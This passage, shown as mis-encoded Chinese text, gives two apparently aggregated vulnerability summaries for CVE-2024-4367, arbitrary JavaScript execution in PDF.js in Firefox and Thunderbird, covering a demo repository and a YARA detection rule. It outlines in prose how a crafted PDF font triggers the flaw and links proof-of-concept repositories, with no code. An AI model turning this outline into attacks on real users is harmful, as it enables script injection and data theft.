**å±å®³ç­‰çº§:** é«˜å±ï¼Œå…è®¸åœ¨ PDF.js ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œä»»æ„ JavaScript ä»£ç 

**å½±å“ç‰ˆæœ¬:** Firefox < 126, Firefox ESR < 115.11, Thunderbird < 115.11

**åˆ©ç”¨æ¡ä»¶:** ç”¨æˆ·éœ€è¦æ‰“å¼€æ¶æ„çš„ PDF æ–‡ä»¶

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2024-4367 æ¼æ´æ˜¯ Mozilla Firefox, Firefox ESR, Thunderbird ä¸­ PDF.js ç»„ä»¶çš„ä¸€ä¸ªæ¼æ´ï¼Œç”±äºå¤„ç†å­—ä½“æ—¶ç¼ºå°‘ç±»å‹æ£€æŸ¥ï¼Œå…è®¸åœ¨ PDF.js ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œä»»æ„ JavaScript ä»£ç ã€‚ æ”»å‡»è€…å¯ä»¥æ„é€ æ¶æ„çš„ PDF æ–‡ä»¶ï¼Œå½“ç”¨æˆ·ä½¿ç”¨å—å½±å“çš„æµè§ˆå™¨æˆ– Thunderbird æ‰“å¼€æ­¤ PDF æ–‡ä»¶æ—¶ï¼Œæ¶æ„ JavaScript ä»£ç å°†è¢«æ‰§è¡Œã€‚ ä»æä¾›çš„æ¼æ´åˆ©ç”¨ä»£ç æ¥çœ‹ï¼Œå®ƒæä¾›äº†ä¸€ä¸ªæœ¬åœ°çš„å¼€å‘ç¯å¢ƒæ¥éªŒè¯å’Œæµ‹è¯•åˆ©ç”¨æ­¤æ¼æ´çš„ PDF æ–‡ä»¶ã€‚ è¯¥ POC ä»£ç åŒ…å«ä¸€ä¸ªç”¨äºæ¼”ç¤ºæ¼æ´åˆ©ç”¨çš„ Web æœåŠ¡å™¨ï¼Œå¹¶æä¾›ä¸åŒå‰ç«¯æ¡†æ¶ï¼ˆReact, Vue, Svelteï¼‰çš„ç»„ä»¶ã€‚é€šè¿‡ä¿®æ”¹ç»„ä»¶æŒ‡å‘çš„ PDF æ–‡ä»¶ï¼Œå¯ä»¥æµ‹è¯•ä¸åŒçš„æ”»å‡»è½½è·ã€‚

**æœ‰æ•ˆæ€§è¯„ä¼°:**

æ ¹æ®æ¼æ´åº“ä¿¡æ¯å’Œæœç´¢ç»“æœï¼ˆç‰¹åˆ«æ˜¯ GitHub ä¸Šçš„ POC ä»“åº“ï¼‰ï¼Œè¯¥æ¼æ´è¢«ç¡®è®¤å­˜åœ¨ä¸”æœ‰å¯ç”¨çš„ POC ä»£ç ã€‚ POC ä»£ç æä¾›äº†ä¸€ä¸ªæµ‹è¯•ç¯å¢ƒï¼Œå¯ä»¥ç”¨æ¥éªŒè¯æ¼æ´åˆ©ç”¨ã€‚ å› æ­¤ï¼Œè¯¥æ¼æ´çš„åˆ©ç”¨æ˜¯æœ‰æ•ˆçš„ã€‚

**æŠ•æ¯’é£é™©è¯„ä¼°:**

åˆ†ææä¾›çš„ä»£ç ä»“åº“ï¼Œå‘ç°è¯¥ä»“åº“ä¸»è¦æ˜¯ä¸ºäº†æ¼”ç¤ºå’ŒéªŒè¯ CVE-2024-4367 æ¼æ´ï¼Œæœ¬èº«æä¾›äº† react, vue, svelte ä¸‰ç§æ¡†æ¶æ¥æ¼”ç¤ºæ¼æ´ï¼Œä»£ç æœ¬èº«ç›¸å¯¹æ¸…æ™°ã€‚ å­˜åœ¨çš„é£é™©æ˜¯ç”±äºè¯¥æ¼æ´æœ¬èº«ä¼šå¯¼è‡´ä»»æ„ JavaScript ä»£ç æ‰§è¡Œï¼Œæ”»å‡»è€…å¯èƒ½é€šè¿‡ä¿®æ”¹æµ‹è¯• PDF æ–‡ä»¶æˆ–è€…å‰ç«¯ä»£ç ï¼ˆè™½ç„¶ä¸å¤ªå®¹æ˜“ï¼‰æ¥å¼•å…¥æ¶æ„ä»£ç ï¼Œä»è€Œå®ç°æŠ•æ¯’æ”»å‡»ã€‚ å› æ­¤ï¼Œå­˜åœ¨ä¸€å®šçš„æŠ•æ¯’é£é™©ï¼Œä½†ä¸»è¦é›†ä¸­åœ¨ä½¿ç”¨è¯¥ POC ä»£ç æ—¶ï¼Œç”¨æˆ·éœ€è¦æ£€æŸ¥å’ŒéªŒè¯æ‰€ä½¿ç”¨çš„ PDF æ–‡ä»¶å’Œå‰ç«¯ä»£ç çš„å®‰å…¨æ€§ã€‚ ä»£ç æ¡†æ¶è¾ƒä¸ºè§„èŒƒï¼Œæ²¡æœ‰æ˜æ˜¾çš„æ¶æ„è¡Œä¸ºï¼Œä½œè€…å¯èƒ½åªæ˜¯æƒ³æ¼”ç¤ºæ¼æ´ï¼Œè€Œä¸æ˜¯è¿›è¡Œæ¶æ„æ´»åŠ¨ã€‚ è€ƒè™‘åˆ°è¿™äº›å› ç´ ï¼ŒæŠ•æ¯’é£é™©ä¼°è®¡ä¸º 10%ã€‚

**åˆ©ç”¨æ–¹å¼åˆ†æ:**

1.  **æ¼æ´æ ¹æºï¼š** PDF.js åœ¨å¤„ç† PDF æ–‡ä»¶ä¸­çš„å­—ä½“æ—¶ï¼Œç¼ºå°‘å¿…è¦çš„ç±»å‹æ£€æŸ¥ã€‚
2.  **æ”»å‡»æ–¹å¼ï¼š** æ”»å‡»è€…æ„é€ ä¸€ä¸ªåŒ…å«æ¶æ„ JavaScript ä»£ç çš„ç‰¹åˆ¶ PDF æ–‡ä»¶ã€‚
3.  **æ”»å‡»è¿‡ç¨‹ï¼š**
    *   ç”¨æˆ·ä½¿ç”¨å—å½±å“çš„ Firefox, Firefox ESR æˆ– Thunderbird ç‰ˆæœ¬æ‰“å¼€è¯¥æ¶æ„ PDF æ–‡ä»¶ã€‚
    *   PDF.js è§£æè¯¥ PDF æ–‡ä»¶ã€‚
    *   ç”±äºç¼ºå°‘ç±»å‹æ£€æŸ¥ï¼Œæ¶æ„ JavaScript ä»£ç åœ¨ PDF.js çš„ä¸Šä¸‹æ–‡ä¸­è¢«æ‰§è¡Œã€‚
4.  **æ”»å‡»ç»“æœï¼š** æ¶æ„ JavaScript ä»£ç å¯ä»¥æ‰§è¡Œå„ç§æ¶æ„æ“ä½œï¼Œä¾‹å¦‚çªƒå–æ•æ„Ÿä¿¡æ¯ã€æ‰§è¡Œä»»æ„ä»£ç ç­‰ã€‚ ç”±äº PDF.js è¿è¡Œåœ¨æµè§ˆå™¨çš„å®‰å…¨ä¸Šä¸‹æ–‡ä¸­ï¼Œæ”»å‡»è€…é€šå¸¸æ— æ³•ç›´æ¥è®¿é—®æ“ä½œç³»ç»Ÿçš„åº•å±‚èµ„æºã€‚ ç„¶è€Œï¼Œåœ¨æŸäº›æƒ…å†µä¸‹ï¼Œä»–ä»¬å¯èƒ½é€šè¿‡å…¶ä»–æ¼æ´æˆ–åˆ©ç”¨æµè§ˆå™¨çš„åŠŸèƒ½æ¥æå‡æƒé™ã€‚

**é¡¹ç›®åœ°å€:** [snyk-labs/pdfjs-vuln-demo](https://github.com/snyk-labs/pdfjs-vuln-demo)

**æ¼æ´è¯¦æƒ…:** [CVE-2024-4367](https://nvd.nist.gov/vuln/detail/CVE-2024-4367)

---

## POC #23

**æ¥æº**: [CVE-2024-4367-spaceraccoon_detect-cve-2024-4367.md](../2024/CVE-2024-4367-spaceraccoon_detect-cve-2024-4367.md)

## CVE-2024-4367-PDF.js-ä»»æ„JavaScriptæ‰§è¡Œ

**æ¼æ´ç¼–å·:** CVE-2024-4367

**æ¼æ´ç±»å‹:** ä»»æ„JavaScriptæ‰§è¡Œ

**å½±å“åº”ç”¨:** PDF.js (Firefox, Firefox ESR, Thunderbird)

**å±å®³ç­‰çº§:** ä¸­å±ï¼Œå¯èƒ½å¯¼è‡´æ•æ„Ÿä¿¡æ¯æ³„éœ²æˆ–è·¨ç«™è„šæœ¬æ”»å‡»

**å½±å“ç‰ˆæœ¬:** Firefox < 126, Firefox ESR < 115.11, Thunderbird < 115.11

**åˆ©ç”¨æ¡ä»¶:** ç”¨æˆ·æ‰“å¼€æ¶æ„çš„PDFæ–‡ä»¶

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 0%

## è¯¦æƒ…

CVE-2024-4367 æ˜¯ PDF.js ä¸­çš„ä¸€ä¸ªæ¼æ´ï¼Œç”±äºç¼ºå°‘å­—ä½“å¤„ç†æ—¶çš„ç±»å‹æ£€æŸ¥ï¼Œå…è®¸åœ¨ PDF.js ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œä»»æ„ JavaScript ä»£ç ã€‚

**æœ‰æ•ˆæ€§ï¼š**

æ ¹æ®æ¼æ´åº“ä¿¡æ¯å’Œæœç´¢å¼•æ“ç»“æœï¼Œè¯¥æ¼æ´å·²ç¡®è®¤å­˜åœ¨ï¼Œå¹¶ä¸”æœ‰POCå¯ç”¨ï¼ˆ[webpage 6] æåˆ°äº† `exfil0/WEAPONIZING-CVE-2024-4367`ï¼Œæä¾›äº†åˆ©ç”¨ä»£ç ï¼‰ã€‚æä¾›çš„YARAè§„åˆ™å¯ä»¥ç”¨äºæ£€æµ‹åˆ©ç”¨æ­¤æ¼æ´çš„PDFæ–‡ä»¶ï¼Œè¡¨æ˜POCçš„æœ‰æ•ˆæ€§ã€‚

**æŠ•æ¯’é£é™©ï¼š**

æä¾›çš„ä»£ç åŒ…å«ä¸€ä¸ªYARAè§„åˆ™ï¼Œç”¨äºæ£€æµ‹åˆ©ç”¨CVE-2024-4367çš„PDFæ–‡ä»¶ã€‚LICENSEå’ŒREADMEæ–‡ä»¶æ˜¯æ ‡å‡†çš„å¼€æºé¡¹ç›®æ–‡ä»¶ï¼Œæ²¡æœ‰è¿¹è±¡è¡¨æ˜å­˜åœ¨æ¶æ„ä»£ç ã€‚å› æ­¤ï¼ŒæŠ•æ¯’é£é™©æä½ï¼Œä¸º0%ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**

1.  æ”»å‡»è€…æ„é€ ä¸€ä¸ªæ¶æ„çš„PDFæ–‡ä»¶ï¼Œè¯¥æ–‡ä»¶åŒ…å«ç‰¹åˆ¶çš„å­—ä½“æ•°æ®ï¼Œåˆ©ç”¨äº† PDF.js ä¸­å­—ä½“å¤„ç†æ—¶ç¼ºå¤±çš„ç±»å‹æ£€æŸ¥ã€‚
2.  å½“ç”¨æˆ·ä½¿ç”¨å—å½±å“çš„ Firefoxã€Firefox ESR æˆ– Thunderbird ç‰ˆæœ¬æ‰“å¼€è¯¥PDFæ–‡ä»¶æ—¶ï¼ŒPDF.js ä¼šè§£æè¯¥æ–‡ä»¶ã€‚
3.  ç”±äºç¼ºå°‘ç±»å‹æ£€æŸ¥ï¼Œæ¶æ„çš„å­—ä½“æ•°æ®ä¼šå¯¼è‡´ä»»æ„ JavaScript ä»£ç åœ¨ PDF.js çš„ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œã€‚
4.  æ‰§è¡Œçš„ JavaScript ä»£ç å¯ä»¥è®¿é—® PDF.js çš„å†…éƒ¨å¯¹è±¡å’Œå‡½æ•°ï¼Œä»è€Œå¯èƒ½å¯¼è‡´æ•æ„Ÿä¿¡æ¯æ³„éœ²ï¼Œæˆ–æ‰§è¡Œå…¶ä»–æ¶æ„æ“ä½œï¼Œå¦‚è·¨ç«™è„šæœ¬æ”»å‡»(å¦‚æœPDF.jsè¢«åµŒå…¥åœ¨ç½‘é¡µä¸­)ã€‚

æ€»çš„æ¥è¯´ï¼Œåˆ©ç”¨æ–¹å¼æ˜¯é€šè¿‡æ„é€ åŒ…å«æ¶æ„å­—ä½“çš„PDFæ–‡ä»¶ï¼Œç»•è¿‡ç±»å‹æ£€æŸ¥ï¼Œè§¦å‘ JavaScript ä»£ç æ‰§è¡Œã€‚

**é¡¹ç›®åœ°å€:** [spaceraccoon/detect-cve-2024-4367](https://github.com/spaceraccoon/detect-cve-2024-4367)

**æ¼æ´è¯¦æƒ…:** [CVE-2024-4367](https://nvd.nist.gov/vuln/detail/CVE-2024-4367)

---

